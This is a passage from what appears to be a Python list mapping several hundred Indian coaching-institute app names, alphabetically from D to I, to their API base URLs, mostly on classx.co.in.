    ("Diligentsscian", "https://diligentsscianapi.classx.co.in"),
    ("Dilipkhatekar", "https://dilipkhatekarapi.classx.co.in"),
    ("Dimplekaushikenglishclasses", "https://dimplekaushikenglishclassesapi.classx.co.in"),
    ("Dineshacademy20", "https://dineshacademyapi.classx.co.in"),
    ("Directionacademy", "https://directionacademyapi.classx.co.in"),
    ("Directionrojgaracademy", "https://directionrojgaracademyapi.classx.co.in"),
    ("Discoveryiasacademy", "https://discoveryiasacademyapi.classx.co.in"),
    ("Dishaacademy", "https://dishaacademyapi.classx.co.in"),
    ("Dishaonlineclasses", "https://dishaonlineclassesapi.classx.co.in"),
    ("Divijatutorials", "https://divijatutorialsapi.classx.co.in"),
    ("Divinestudy", "https://divinestudyapi.classx.co.in"),
    ("Divyadrishticlasses", "https://divyadrishticlassesapi.classx.co.in"),
    ("Dixitsir", "https://dixitsirapi.classx.co.in"),
    ("Djmcforyou", "https://djmcforyouapi.classx.co.in"),
    ("Dkshiksha", "https://dkshikshaapi.classx.co.in"),
    ("Dnanursing", "https://dnanursingapi.classx.co.in"),
    ("Dnyanadeepacademypune", "https://dnyanadeepacademypuneapi.classx.co.in"),
    ("Dnyanaiacademy", "https://dnyanaiacademyapi.classx.co.in"),
    ("Dnyanankuracademypune", "https://dnyanankuracademypuneapi.classx.co.in"),
    ("Dnyanarnavonlineacademy", "https://dnyanarnavonlineacademyapi.classx.co.in"),
    ("Dnyandeepallin1", "https://dnyandeepallapi.classx.co.in"),
    ("Dnyandeepwallah", "https://dnyandeepwallahapi.classx.co.in"),
    ("Dnyaneshwarpatilsgurukulprabodhinipune", "https://dnyaneshwarpatilgurukulprabodhiniapi.classx.co.in"),
    ("Dnyanpeethacademyamravati", "https://dnyanpeethacademyamravatiapi.classx.co.in"),
    ("Dnyanrajacademy", "https://dnyanrajacademyapi.classx.co.in"),
    ("Dnyanvisharadbykamlakarsir", "https://dnyanvisharadkamlakarsirapi.classx.co.in"),
    ("Dnyndeepacademyambajogai", "https://dnyndeepacademyambajogaiapi.classx.co.in"),
    ("Dobhaifreepadhai", "https://dobhaifreepadhaiapi.classx.co.in"),
    ("Dobook", "https://dobookapi.classx.co.in"),
    ("Doeduadphycinstitute", "https://doeduadphycinstituteapi.classx.co.in"),
    ("Doonlawmentor", "https://doonlawmentorapi.classx.co.in"),
    ("Drajayyawaleacademy", "https://drajayyawaleacademyapi.classx.co.in"),
    ("Dramarjagtap", "https://dramarjagtapapi.classx.co.in"),
    ("Dramitsias", "https://dramitsiasapi.classx.co.in"),
    ("Dranandmani", "https://dranandmaniapi.classx.co.in"),
    ("Drdkkaushiksenglish", "https://drdkkaushikenglishapi.classx.co.in"),
    ("Dreamexam", "https://dreamexamapi.classx.co.in"),
    ("Dreamkhaki", "https://dreamkhakiapi.classx.co.in"),
    ("Dreamsewakiasthelearningapp", "https://dreamsewakiasapi.classx.co.in"),
    ("Dreamteam", "https://dreamteamapi.classx.co.in"),
    ("Dreducationofficial", "https://dreducationofficialapi.classx.co.in"),
    ("Drgoswamiacademy", "https://goswamiacademyapi.classx.co.in"),
    ("Drgreenagroclassesudaipur", "https://drgreenagroclassesudaipurapi.classx.co.in"),
    ("Drishta", "https://drishtaapi.classx.co.in"),
    ("Drishtipedia", "https://drishtipediaapi.classx.co.in"),
    ("Dronacharyaacademybyudaysir", "https://dronacharyaacademyudaysirapi.classx.co.in"),
    ("Drsachin", "https://drsachinbhaskesshardaacademyapi.classx.co.in"),
    ("Drsachinkapur", "https://drsachinkapurapi.classx.co.in"),
    ("Drsahilclasses", "https://drsahilclassesapi.classx.co.in"),
    ("Drsanjayatrieducation", "https://drsanjayatrieducationapi.classx.co.in"),
    ("Drsgoswamiclasses", "https://drsgoswamiclassesapi.classx.co.in"),
    ("Dryokesharul", "https://dryokesharulapi.classx.co.in"),
    ("Dslclassesjind", "https://dslclassesjindapi.classx.co.in"),
    ("Dteach", "https://dteachapi.classx.co.in"),
    ("Dts", "https://dtsapi.classx.co.in"),
    ("Dufferadda", "https://dufferaddaapi.classx.co.in"),
    ("Dvstechgovtjobskillprep", "https://dvstechgovtjobskillprepapi.classx.co.in"),
    ("Dyasvardicha", "https://dyasvardichaapi.classx.co.in"),
    ("Dynamiccoachingcentre", "https://dynamiccoachingcentreapi.classx.co.in"),
    ("Dzklive", "https://dzkliveapi.classx.co.in"),
    ("E1Coaching", "https://e1coachingcenterapi.classx.co.in"),
    ("E2Academy", "https://e2academyapi.classx.co.in"),
    ("E3Lacademy", "https://e3lacademyapi.classx.co.in"),
    ("Eabhyasu", "https://eabhyasuapi.classx.co.in"),
    ("Easy2Learning20", "https://easy2learning2api.classx.co.in"),
    ("Easyagriculture", "https://easyagricultureapi.classx.co.in"),
    ("Easyenglish", "https://easyenglishapi.classx.co.in"),
    ("Easyreasoningclassesbyrahulsir", "https://easyreasoningclassesrahulsirapi.classx.co.in"),
    ("Ebsexcellentbookstore", "https://excellentbookstoreapi.classx.co.in"),
    ("Ecacademy", "https://ecacademyapi.classx.co.in"),
    ("Ecomath", "https://ecomathapi.classx.co.in"),
    ("Economicsbyshrikantkalaskar", "https://economicsshrikantkalaskarapi.classx.co.in"),
    ("Economicspreparation", "https://economicspreparationapi.classx.co.in"),
    ("Economybydhananjaymate", "https://dhananjaymatesswarajyaacademyapi.classx.co.in"),
    ("Ecopathshala", "https://ecopathshalaapi.classx.co.in"),
    ("Ecotutorialsbymandeep", "https://ecotutorialsmandeepapi.classx.co.in"),
    ("Edgeias", "https://edgeiasapi.classx.co.in"),
    ("Edu4Tech", "https://edu4techapi.classx.co.in"),
    ("Educaptain", "https://educaptainapi.classx.co.in"),
    ("Educateindia", "https://educateindiaapi.classx.co.in"),
    ("Educationaddaplus", "https://educationaddaplusapi.classx.co.in"),
    ("Educationgalaxy", "https://educationgalaxyapi.classx.co.in"),
    ("Educationpathshala", "https://educationpathshalaapi.classx.co.in"),
    ("Educationpointharidwar", "https://educationpointharidwarapi.classx.co.in"),
    ("Educationwithsv", "https://educationsvapi.classx.co.in"),
    ("Educatorsplus", "https://educatorsplusapi.classx.co.in"),
    ("Educracy", "https://educracyapi.classx.co.in"),
    ("Eduexcellence", "https://eduexcellenceapi.classx.co.in"),
    ("Edukrishnaofficial", "https://edukrishnapi.classx.co.in"),
    ("Edukunjprime", "https://edukunjprimeapi.classx.co.in"),
    ("Edulogy", "https://edulogyapi.classx.co.in"),
    ("Edumedhbymahipalsir", "https://edumedhmahipalsirapi.classx.co.in"),
    ("Eduparcham", "https://eduapi.classx.co.in"),
    ("Eduzonin", "https://eduzoninapi.classx.co.in"),
    ("Eeeclive", "https://eeecliveapi.classx.co.in"),
    ("Effectivestudy", "https://effectivestudyapi.classx.co.in"),
    ("Ekalavya", "https://ekalavyaapi.classx.co.in"),
    ("Ekdantamclasses", "https://ekdantamclassesapi.classx.co.in"),
    ("Ekdumbasic", "https://ekdumbasicapi.classx.co.in"),
    ("Ekprayas", "https://ekprayasapi.classx.co.in"),
    ("Elearningstudyadda", "https://elearningstudyaddaapi.classx.co.in"),
    ("Electricaldost", "https://electricaldostapi.classx.co.in"),
    ("Electricaleng", "https://electricenglishapi.classx.co.in"),
    ("Electricalengineeringmcq", "https://electricalengineeringmcqapi.classx.co.in"),
    ("Eliteiasacademy", "https://eliteiasacademyapi.classx.co.in"),
    ("Endeavoracademy", "https://endeavoracademyapi.classx.co.in"),
    ("Engineeringfunda", "https://engineeringfundaapi.classx.co.in"),
    ("Engineersgroup", "https://engineersgroupapi.classx.co.in"),
    ("Engineerswala", "https://engineerswalaapi.classx.co.in"),
    ("Engineerswaveinstitute", "https://engineerswaveinstituteapi.classx.co.in"),
    ("Englishbyamysir", "https://englishbyamysirapi.classx.co.in"),
    ("Englishbydksir", "https://englishdksirapi.classx.co.in"),
    ("Englishbyjaisir", "https://englishjaisirapi.classx.co.in"),
    ("Englishbyroshansir", "https://englishroshansirapi.classx.co.in"),
    ("Englishbyvijender", "https://englishvijenderapi.classx.co.in"),
    ("Englishdiscovery", "https://englishdiscoveryapi.classx.co.in"),
    ("Englishdriveonline", "https://englishdriveonlineapi.classx.co.in"),
    ("Englishforall", "https://englishforallapi.classx.co.in"),
    ("Englishfromzero", "https://englishfromzeroapi.classx.co.in"),
    ("Englishgrammarbyrahulaute", "https://englishgrammarrahulauteapi.classx.co.in"),
    ("Englishnotebook", "https://englishnotebookapi.classx.co.in"),
    ("Englishramesh", "https://englishrameshapi.classx.co.in"),
    ("Englishwithashutoshsir", "https://englishashutoshsirapi.classx.co.in"),
    ("Englishwithbalasaheb", "https://englishwithbalasahebapi.classx.co.in"),
    ("Englishwithheman", "https://englishwithhemantapi.classx.co.in"),
    ("Englishwithnitinsir", "https://englishnitinsirapi.classx.co.in"),
    ("Englishwithrajesh", "https://englishrajeshapi.classx.co.in"),
    ("Englishwithsanjeevsir", "https://englishsanjeevsirapi.classx.co.in"),
    ("Englishworld", "https://englishworldapi.classx.co.in"),
    ("Englisio", "https://englisioapi.classx.co.in"),
    ("Envisionjeeneet", "https://envisionjeeneetapi.classx.co.in"),
    ("Erdr", "https://erdrapi.classx.co.in"),
    ("Ervkguptacampusexammantra", "https://ervkguptacampusapi.classx.co.in"),
    ("Et", "https://etapi.classx.co.in"),
    ("Etcenglishtrainingcentre", "https://englishtrainingcentreapi.classx.co.in"),
    ("Etechpathashala", "https://etechpathashalaapi.classx.co.in"),
    ("Etestseriestestbook", "https://etestseriescompetitiveexamstestbookapi.classx.co.in"),
    ("Ethicaedutech", "https://ethicaedutechapi.classx.co.in"),
    ("Eurekaacademylive", "https://eurekaacademyliveapi.classx.co.in"),
    ("Exam", "https://examjunctionapi.classx.co.in"),
    ("Exama2Z", "https://exama2zapi.classx.co.in"),
    ("Examadda360", "https://examadda360api.classx.co.in"),
    ("Examania", "https://examaniaapi.classx.co.in"),
    ("Examaspirants", "https://examaspirantsapi.classx.co.in"),
    ("Examboardhsscssccet", "https://examboardhsscssccetapi.classx.co.in"),
    ("Exambulls9", "https://exambulls9api.classx.co.in"),
    ("Examchase", "https://examchaseapi.classx.co.in"),
    ("Examchip", "https://examchipapi.classx.co.in"),
    ("Examcoach", "https://examcoachapi.classx.co.in"),
    ("Examdost", "https://examdostapi.classx.co.in"),
    ("Examdrishti", "https://examdrishtiapi.classx.co.in"),
    ("Exameducation", "https://exameducationapi.classx.co.in"),
    ("Exameducator", "https://exameducatorapi.classx.co.in"),
    ("Examfactacademy", "https://examfactacademyapi.classx.co.in"),
    ("Examfirst", "https://englishallinoneapi.classx.co.in"),
    ("Examgravity", "https://examgravityapi.classx.co.in"),
    ("Examguideapp", "https://examguideappapi.classx.co.in"),
    ("Examguruji", "https://examgurujiapi.classx.co.in"),
    ("Examgurutipsandtricks", "https://examgurutipstricksapi.classx.co.in"),
    ("Examhelpline", "https://examhelplineapi.classx.co.in"),
    ("Examindia", "https://examindiaapi.classx.co.in"),
    ("Examjn", "https://examjnapi.classx.co.in"),
    ("Exammanch", "https://exammanchapi.classx.co.in"),
    ("Exammantra", "https://exammantraapi.classx.co.in"),
    ("Exammaster", "https://exammasterapi.classx.co.in"),
    ("Examnagari", "https://examnagariapi.classx.co.in"),
    ("Examnity", "https://examnityapi.classx.co.in"),
    ("Examo", "https://examoapi.classx.co.in"),
    ("Exampathikclasses", "https://exampathikclassesapi.classx.co.in"),
    ("Exampoll", "https://exampollapi.classx.co.in"),
    ("Examprep", "https://examprepapi.classx.co.in"),
    ("Examprodigital", "https://examprodigitalapi.classx.co.in"),
    ("Exampunjabi", "https://exampunjabiapi.classx.co.in"),
    ("Exampur", "https://exampurappapi.classx.co.in"),
    ("Examqualifier", "https://examqualifierapi.classx.co.in"),
    ("Examscalegovtjobsexamprep", "https://examscalegovtjobsexamprepapi.classx.co.in"),
    ("Examscentre247", "https://examscentre247api.classx.co.in"),
    ("Examsquadprofessionalhub", "https://examsquadprofessionalhubapi.classx.co.in"),
    ("Examsrank", "https://examsrankapi.classx.co.in"),
    ("Examstrong", "https://examstrongapi.classx.co.in"),
    ("Examstudyengineering", "https://examstudyengineeringapi.classx.co.in"),
    ("Examtarkash", "https://examtarkashapi.classx.co.in"),
    ("Examtopper", "https://examtopperappapi.classx.co.in"),
    ("Examtopper9", "https://examtopper9api.classx.co.in"),
    ("Examtricks", "https://examtricksapi.classx.co.in"),
    ("Examvidhi", "https://examvidhiapi.classx.co.in"),
    ("Examwadi", "https://examwadiapi.classx.co.in"),
    ("Examyug24", "https://examyug24api.classx.co.in"),
    ("Examzila", "https://examzilaapi.classx.co.in"),
    ("Examzygovtjobsexamprep", "https://examzygovtjobsexamprepapi.classx.co.in"),
    ("Excellencestudy", "https://excellencestudyapi.classx.co.in"),
    ("Expertphysics20", "https://expertphysicsapi.classx.co.in"),
    ("Exploringgoals", "https://exploringgoalsapi.classx.co.in"),
    ("Expresstrainingservices", "https://expresstrainingservicesapi.classx.co.in"),
    ("Faibs", "https://fabisinstituteofmathematicsapi.classx.co.in"),
    ("Farmeducation", "https://farmeducationapi.classx.co.in"),
    ("Farmeducon", "https://farmeduconapi.classx.co.in"),
    ("Fastrackmathsreasoning", "https://fastrackandmathsreasoningapi.classx.co.in"),
    ("Fatehkar", "https://fatehkarapi.classx.co.in"),
    ("Feelthephysics", "https://feelphysicsapi.classx.co.in"),
    ("Finaltouchacademy", "https://finaltouchacademyapi.classx.co.in"),
    ("Fipinactive", "https://funpathshalaapi.classx.co.in"),
    ("Fittiti", "https://fittitiapi.classx.co.in"),
    ("Focusacademy", "https://focusacademyapi.classx.co.in"),
    ("Fojicircle", "https://fojicircleapi.classx.co.in"),
    ("Forcegalaxy", "https://forcegalaxyapi.classx.co.in"),
    ("Formulator", "https://formulatorapi.classx.co.in"),
    ("Foundationlearning", "https://foundationlearningapi.classx.co.in"),
    ("Foundationmathsexam", "https://foundationmathsexamapi.classx.co.in"),
    ("Fourhandsedusys", "https://fourhandsedusysapi.classx.co.in"),
    ("Freejobsinformation", "https://freejobsinformationapi.classx.co.in"),
    ("Freetest", "https://freetestapi.classx.co.in"),
    ("Freshernowtelugu", "https://freshernowteluguapi.classx.co.in"),
    ("Ftiiandsrfti", "https://ftiiandsrftiapi.classx.co.in"),
    ("Fullscore", "https://fullscoreapi.classx.co.in"),
    ("Fume", "https://fumeappapi.classx.co.in"),
    ("Funinpathsala", "https://fipapi.classx.co.in"),
    ("Futurekulcollege", "https://futurekulcollegeapi.classx.co.in"),
    ("Futurerojgar", "https://futurerojgarapi.classx.co.in"),
    ("Futurewillacademy", "https://futurewillacademyapi.classx.co.in"),
    ("G9Studybypatelsir", "https://g9studypatelsirapi.classx.co.in"),
    ("Gabypiyushsir", "https://gabypiyushsirapi.classx.co.in"),
    ("Gadgetsonemalayalam", "https://gadgetsonemalayalamapi.classx.co.in"),
    ("Gaganpratapmaths", "https://gaganpratapmathsapi.classx.co.in"),
    ("Galaxyonlineworld", "https://galaxyonlineworldapi.classx.co.in"),
    ("Gamepgapp", "https://gamepgappapi.classx.co.in"),
    ("Gammyanirdesha", "https://gammyanirdeshaapi.classx.co.in"),
    ("Ganeshaglobal", "https://ganeshaglobalapi.classx.co.in"),
    ("Ganeshkadsacademy", "https://ganeshkadacademyapi.classx.co.in"),
    ("Ganeshkawaneacademy", "https://ganeshkawaneacademyapi.classx.co.in"),
    ("Ganpatgurukulphulera", "https://ganpatgurukulphuleraapi.classx.co.in"),
    ("Garvitpublications", "https://garvitpublicationsapi.classx.co.in"),
    ("Gateacademyvod", "https://gateacademyvodapi.classx.co.in"),
    ("Gatecsebyamitkhurana", "https://gatecseamitkhuranaapi.classx.co.in"),
    ("Gauravjunction", "https://gauravjunctionapi.classx.co.in"),
    ("Gauravkaushal", "https://gauravkaushalapi.classx.co.in"),
    ("Gauravmadhu", "https://gauravmadhuapi.classx.co.in"),
    ("Gauravsuthar", "https://gauravsutharapi.classx.co.in"),
    ("Gaurshorthandclasses", "https://gaurshorthandclassesapi.classx.co.in"),
    ("Gccampusbygcjakhar", "https://gccampusgcjakharapi.classx.co.in"),
    ("Gccniosclasses", "https://gccniosclassesapi.classx.co.in"),
    ("Gcentrick", "https://gcentrickapi.classx.co.in"),
    ("Gchemclasses", "https://gchemclassesapi.classx.co.in"),
    ("Gdcacademy", "https://gdcacademyapi.classx.co.in"),
    ("Gearinstitute", "https://gearinstituteapi.classx.co.in"),
    ("Geetanjaliras", "https://geetanjalirasapi.classx.co.in"),
    ("Genique", "https://geniqueapi.classx.co.in"),
    ("Geniuselearning", "https://geniuselearningapi.classx.co.in"),
    ("Geniusias", "https://geniusiasapi.classx.co.in"),
    ("Geniusinstitute", "https://geniusinstituteapi.classx.co.in"),
    ("Geniusmaker", "https://geniusmakerapi.classx.co.in"),
    ("Geniusmaths", "https://geniusmathsapi.classx.co.in"),
    ("Geniusstudycircle", "https://geniusstudycircleapi.classx.co.in"),
    ("Geniusvidyarthi", "https://geniusvidyarthiapi.classx.co.in"),
    ("Gennextcareeracademy", "https://gennextcareeracademyapi.classx.co.in"),
    ("Genomicmedical", "https://genomicmedicalapi.teachx.in"),
    ("Genomicmedicalandnursing", "https://genomicmedicalapi.classx.co.in"),
    ("Geobyavdhutsir", "https://geoavbhutsirapi.classx.co.in"),
    ("Geographyacademy", "https://geographyacademyapi.classx.co.in"),
    ("Geographyandagriculturebypvsir", "https://geographyagriculturepvsirapi.classx.co.in"),
    ("Geographybydrvikaschoudhary", "https://geographyvikaschoudharyapi.classx.co.in"),
    ("Geographybyjanaiahsir", "https://geographyjanaiahsirapi.classx.co.in"),
    ("Geographybysachinshinde", "https://geographysachinshindeapi.classx.co.in"),
    ("Geographybyyogeshsir", "https://geographyyogeshsirapi.classx.co.in"),
    ("Geologywala", "https://geologywalaapi.classx.co.in"),
    ("Geopixelacademy", "https://geopixelacademyapi.classx.co.in"),
    ("Getapt", "https://getaptapi.classx.co.in"),
    ("Ggtfit", "https://ggtfitapi.classx.co.in"),
    ("Gkbysatishshindelatur", "https://gksatishshindelaturapi.classx.co.in"),
    ("Gkcafe", "https://gkcafeapi.classx.co.in"),
    ("Gkgsmasti", "https://gkgsmastiapi.classx.co.in"),
    ("Gkhouseexams", "https://gkhouseexamsapi.classx.co.in"),
    ("Gkmathsreasoning", "https://gkmathsreasoningapi.classx.co.in"),
    ("Gknagri", "https://gknagriapi.classx.co.in"),
    ("Gksacademyudaipur", "https://gksacademyudaipurapi.classx.co.in"),
    ("Gkstudygovtexamspreparation", "https://gkstudygovtexamspreparationapi.classx.co.in"),
    ("Gkwalesonusir", "https://gkwalesonusirapi.classx.co.in"),
    ("Gkwithvikassuthar", "https://gkvikassutharapi.classx.co.in"),
    ("Globalclasses", "https://globalclassesapi.classx.co.in"),
    ("Gmacademympsc", "https://gmacademympscapi.classx.co.in"),
    ("Gmade", "https://gmadeapi.classx.co.in"),
    ("Gnceducare", "https://gnceducareapi.classx.co.in"),
    ("Goalinstitute", "https://goalinstituteapi.classx.co.in"),
    ("Goalyaan", "https://goalyaanapi.classx.co.in"),
    ("Goforeducation", "https://goforeducationapi.classx.co.in"),
    ("Gogreen", "https://gogreenapi.classx.co.in"),
    ("Goldencareer", "https://goldencareersapi.classx.co.in"),
    ("Gonagannareddypublications", "https://gonagannareddypublicationsapi.classx.co.in"),
    ("Gonitchorcha", "https://gonitchorchaapi.classx.co.in"),
    ("Gopalgirisirmathsreasoning", "https://gopalgirisirmathsreasoningapi.classx.co.in"),
    ("Govidya", "https://govidyaapi.classx.co.in"),
    ("Govtjobs", "https://govtjobswalaapi.classx.co.in"),
    ("Gradeupstudy", "https://gradeupstudyapi.classx.co.in"),
    ("Greatconcept", "https://greatconceptapi.classx.co.in"),
    ("Greatgeniuses", "https://greatgeniusesapi.classx.co.in"),
    ("Greenboard", "https://greenboardapi.classx.co.in"),
    ("Groskill", "https://groskillapi.classx.co.in"),
    ("Growacademy", "https://growacademyapi.classx.co.in"),
    ("Gsbymanojsir", "https://gsmanojsirapi.classx.co.in"),
    ("Gsbyuttamgore", "https://gsuttamgoreapi.classx.co.in"),
    ("Gsforum", "https://gsforumapi.classx.co.in"),
    ("Gsforumofficial", "https://gsforumofficialapi.classx.co.in"),
    ("Gsmedicalacademy", "https://gsmedicalacademyapi.classx.co.in"),
    ("Gsmlive", "https://gsmliveapi.classx.co.in"),
    ("Gsplanetinstitute", "https://gsplanetinstituteapi.classx.co.in"),
    ("Gswithsandeeptyagi", "https://gswithsandeeptyagiapi.classx.co.in"),
    ("Gsworldonline", "https://gsworldonlineapi.classx.co.in"),
    ("Gtdefenceacademy", "https://gtdefenceacademyapi.classx.co.in"),
    ("Guardeer", "https://guardeerapi.classx.co.in"),
    ("Gulshanbeldarsacademy", "https://gulshanbeldarsacademyapi.classx.co.in"),
    ("Gupteshsiryudhhabhyasiasacademy", "https://gupteshsiryudhhabhyasiasacademyapi.classx.co.in"),
    ("Guruclassesjaipur", "https://guruclassesjaipurapi.classx.co.in"),
    ("Gurudakshina", "https://gurudakshinaapi.classx.co.in"),
    ("Gurueducationhub", "https://gurueducationhubapi.classx.co.in"),
    ("Guruelearning", "https://guruonlineclassesapi.classx.co.in"),
    ("Gurujikags", "https://gurujikagsapi.classx.co.in"),
    ("Gurujiworldexamstudy", "https://gurujiworldexamstudyapi.classx.co.in"),
    ("Gurukulacademy", "https://gurukulacademyapi.classx.co.in"),
    ("Gurukulaenglishtestseries", "https://gurukulaenglishtestseriesapi.classx.co.in"),
    ("Gurukularmy", "https://gurukularmyapi.classx.co.in"),
    ("Gurukulplus", "https://gurukulplusapi.classx.co.in"),
    ("Gurukulprabhodhiniinstitute", "https://gurukulprabodhinipuneapi.classx.co.in"),
    ("Gururehman", "https://gururehmanapi.classx.co.in"),
    ("Gururehmansirliveclasses", "https://gururehmansirliveclassesapi.classx.co.in"),
    ("Gurushalateachersacademy", "https://gurushalateachersacademyapi.classx.co.in"),
    ("Gvkaksha", "https://gvkakshaapi.classx.co.in"),
    ("Gyanaj", "https://gyanajapi.classx.co.in"),
    ("Gyanbindu_appx", "https://gyanbinduapi.appx.co.in"),
    ("Gyanbindu", "https://gyanbinduapi.classx.co.in"),
    ("Gyanbook", "https://gyanbookapi.classx.co.in"),
    ("Gyanbooster", "https://gyanboosterapi.classx.co.in"),
    ("Gyangangaofficial", "https://gyangangaofficialapi.classx.co.in"),
    ("Gyanhub", "https://gyanhubapi.classx.co.in"),
    ("Gyanias", "https://gyaniasapi.classx.co.in"),
    ("Gyanjyoti", "https://gyanjyotiapi.classx.co.in"),
    ("Gyankunjacademy", "https://gyankunjacademyapi.classx.co.in"),
    ("Gyankurfoundation", "https://gyankurfoundationapi.classx.co.in"),
    ("Gyanmadeias", "https://gyanmadeiasapi.classx.co.in"),
    ("Gyannidhiclasses", "https://gyannidhiclassesapi.classx.co.in"),
    ("Gyanodaykeguruji", "https://gyanodaygurujiapi.classx.co.in"),
    ("Gyansootra", "https://gyansootraapi.classx.co.in"),
    ("Gyansthalicommerceclasses", "https://gyansthalicommerceclassesapi.classx.co.in"),
    ("Gyanxp", "https://gyanxpapi.classx.co.in"),
    ("H2Sonlineclasses", "https://h2sonlineclassesapi.classx.co.in"),
    ("Haacademy", "https://haacademyapi.classx.co.in"),
    ("Hadacompetition", "https://hadacompetitionapi.classx.co.in"),
    ("Hamaraplatformlearningapp", "https://hamaraplatformlearningappapi.classx.co.in"),
    ("Hamariacademyofficial", "https://hamariacademyofficialapi.classx.co.in"),
    ("Hamaripariksha", "https://hamariparikshaapi.classx.co.in"),
    ("Handbookacademy", "https://handbookacademyapi.classx.co.in"),
    ("Hanumanshindesprashasancareeracademy", "https://hanumanshindesprashasancareeracademyapi.classx.co.in"),
    ("Happyacademy", "https://happyacademyapi.classx.co.in"),
    ("Harishtiwariclasses", "https://harishtiwariclassesapi.classx.co.in"),
    ("Harkiratsingh", "https://harkiratapi.classx.co.in"),
    ("Harshithinstitute", "https://harshithinstituteapi.classx.co.in"),
    ("Haryanajobcity", "https://haryanajobcityapi.classx.co.in"),
    ("Hcverma", "https://hcvermaapi.classx.co.in"),
    ("Hellorajasthan", "https://hellorajasthanapi.classx.co.in"),
    ("Hellosahitya", "https://hellosahityaapi.classx.co.in"),
    ("Hellosirexampreparationapp", "https://hellosirexampreparationapi.classx.co.in"),
    ("Helloworldbyprince", "https://helloworldprinceapi.classx.co.in"),
    ("Hexamathsbyranjitsinhrajput", "https://hexamathsranjitsinhrajputapi.classx.co.in"),
    ("Hgaurclassespro", "https://hgaurclassesproapi.classx.co.in"),
    ("Highlandparamedicalinstitute", "https://highlandparamedicalinstituteapi.classx.co.in"),
    ("Himalayacoachingclasses", "https://himalayacoachingclassesapi.classx.co.in"),
    ("Himalayaeduhub", "https://himalayaeduhubapi.classx.co.in"),
    ("Himankclasses", "https://himankclassesapi.classx.co.in"),
    ("Himanshusirclasses", "https://himanshusirclassesapi.classx.co.in"),
    ("Himveer", "https://himveerapi.classx.co.in"),
    ("Hinddefenceacademy", "https://hinddefenceacademyapi.classx.co.in"),
    ("Hindiadhyapak", "https://hindiadhyapakapi.classx.co.in"),
    ("Hindiclasses", "https://hindiclassesapi.classx.co.in"),
    ("Hindijoshisir", "https://hindijoshisirapi.classx.co.in"),
    ("Hindimaster", "https://hindimasterapi.classx.co.in"),
    ("Hindipoint", "https://hindipointapi.classx.co.in"),
    ("Hindustanclasses", "https://hindustanclassesapi.classx.co.in"),
    ("Historicaacademy", "https://historicaacademyapi.classx.co.in"),
    ("History360", "https://history360api.classx.co.in"),
    ("Historybychanchalsir", "https://historychanchalsirapi.classx.co.in"),
    ("Historybypawansir", "https://historypawanapi.classx.co.in"),
    ("Historybysachingulig", "https://historysachinguligapi.classx.co.in"),
    ("Historylok", "https://historylokapi.classx.co.in"),
    ("Historywithrohitsir", "https://historywithrohitsirapi.classx.co.in"),
    ("Hitechlearningacademy", "https://hitechlearningacademyapi.classx.co.in"),
    ("Hiteshsirgyankosh", "https://hiteshsirgyankoshapi.classx.co.in"),
    ("Homesciencehub", "https://homesciencehubapi.classx.co.in"),
    ("Hopeeducationjmk", "https://hopeeducationjmkapi.classx.co.in"),
    ("Horizoniasacademy", "https://horizoniasacademyapi.classx.co.in"),
    ("Hornbill", "https://hornbillclassesapi.classx.co.in"),
    ("Hpsuccessclasses", "https://hpsuccessclassesapi.classx.co.in"),
    ("Hrjprep", "https://hrjprepapi.classx.co.in"),
    ("Htcclassesbysksir", "https://htcclassessksirapi.classx.co.in"),
    ("Hundredsxdevs", "https://100xdevsapi.classx.co.in"),
    ("Iace", "https://iaceapi.classx.co.in"),
    ("Iaceonlineclasses", "https://iaceonlineclassesapi.classx.co.in"),
    ("Iasbabuji", "https://iasbabujiapi.classx.co.in"),
    ("Iasplus", "https://iasplusapi.classx.co.in"),
    ("Iceonline", "https://iceonlineapi.classx.co.in"),
    ("Icoaching", "https://icoachingapi.classx.co.in"),
    ("Ics", "https://icsapi.classx.co.in"),
    ("Icseconnect", "https://icseconnectapi.classx.co.in"),
    ("Idealachiever", "https://idealachieverapi.classx.co.in"),
    ("Idealnursingclasses", "https://idealnursingclassesapi.classx.co.in"),
    ("Idealonlineschool", "https://idealonlineschoolapi.classx.co.in"),
    ("Ignite247", "https://ignite247api.classx.co.in"),
    ("Ignitetuition", "https://ignitetuitionapi.classx.co.in"),
    ("Iitguide", "https://iitguideapi.classx.co.in"),
    ("Iitianconcept", "https://iitianconceptapi.classx.co.in"),
    ("Iitiansacademyonline", "https://iitiansacademyonlineapi.classx.co.in"),
    ("Ilearncenter", "https://ilearncenterapi.classx.co.in"),
    ("Ilmitms", "https://ilmitmsapi.classx.co.in"),
    ("Imfsstudyabroad", "https://imfsstudyabroadapi.classx.co.in"),
    ("Impetusedutech", "https://impetusedutechapi.classx.co.in"),
    ("Imransirmaths", "https://imransirmathsapi.classx.co.in"),
    ("Incredibleacademy", "https://incredibleacademyapi.classx.co.in"),
    ("Indiabiology", "https://indiabiologyapi.classx.co.in"),
    ("Indianeducator", "https://indianeducatorapi.classx.co.in"),
    ("Indiannews20", "https://indiannews20api.classx.co.in"),
    ("Indianrojgar", "https://indianrojgarapi.classx.co.in"),
    ("Indiashastralearningapp", "https://indiashastralearningappapi.classx.co.in"),
    ("Indorecscacademy", "https://indorecscacademyapi.classx.co.in"),
    ("Indorephysicalacademy", "https://indorephysicalacademyapi.classx.co.in"),
    ("Indused", "https://indusedapi.classx.co.in"),
    ("Infinimix", "https://infinimixapi.classx.co.in"),
    ("Infinityclassesjaipur", "https://infinityclassesjaipurapi.classx.co.in"),
    ("Infiqueclasses", "https://infiqueclassesapi.classx.co.in"),
    ("Informativeinstitute", "https://informativeinstituteapi.classx.co.in"),
    ("Infotrade_appx", "https://infotradeapi.appx.co.in"),
    ("Infotrade", "https://infotradeapi.classx.co.in"),
    ("Ingliaacademy", "https://ingliaacademyapi.classx.co.in"),
    ("Inspireindiaacademy", "https://inspireindiaacademyapi.classx.co.in"),
    ("Inspirerasacademy", "https://inspirerasacademyapi.classx.co.in"),
    ("Inspiresoftskills", "https://inspiresoftskillsapi.classx.co.in"),
    ("Instacademy", "https://instacademyapi.classx.co.in"),
    ("Instituteofcomputereducation", "https://institutecomputereducationapi.classx.co.in"),
    ("Intelectoin", "https://intelectoinapi.classx.co.in"),
    ("Investaajforkal", "https://investaajforkalapi.classx.co.in"),
    ("Investschool", "https://investschoolapi.classx.co.in"),
    ("Iosreview", "https://iosreviewapi.classx.co.in"),
    ("Ipaperclasses", "https://ipaperclassesapi.classx.co.in"),
    ("Ipbuddy", "https://ipbuddyapi.classx.co.in"),
    ("Iqacademy", "https://iqacademyapi.classx.co.in"),
    ("Iqhike", "https://iqhikeapi.classx.co.in"),
